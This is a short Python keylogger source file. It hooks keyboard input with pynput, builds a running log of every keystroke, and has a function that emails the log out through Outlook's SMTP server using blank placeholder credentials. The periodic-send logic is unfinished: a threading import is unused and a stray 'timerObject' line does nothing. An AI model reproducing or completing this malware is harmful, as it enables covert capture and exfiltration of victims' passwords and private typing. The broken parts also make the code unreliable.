import pynput.keyboard
import smtplib
import threading
import time

log = ""

def CallbackFunction(key):

    global log

    try:
        log = log + str(key.char)
        #log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log+ str(key)
    except:
        pass

    print(log)

def SendEmail(email, password, message):

    emailServer = smtplib.SMTP("smtp-mail.outlook.com", 587)
    emailServer.starttls()
    emailServer.login(email, password)
    emailServer.sendmail(email, email, message)
    emailServer.quit()

keyloggerListener = pynput.keyboard.Listener(on_press=CallbackFunction)

def ThreadFunction():

    global log
    SendEmail("", "", log)
    log = ""
    timerObject



#threading
with keyloggerListener:

    ThreadFunction()
    keyloggerListener.join()




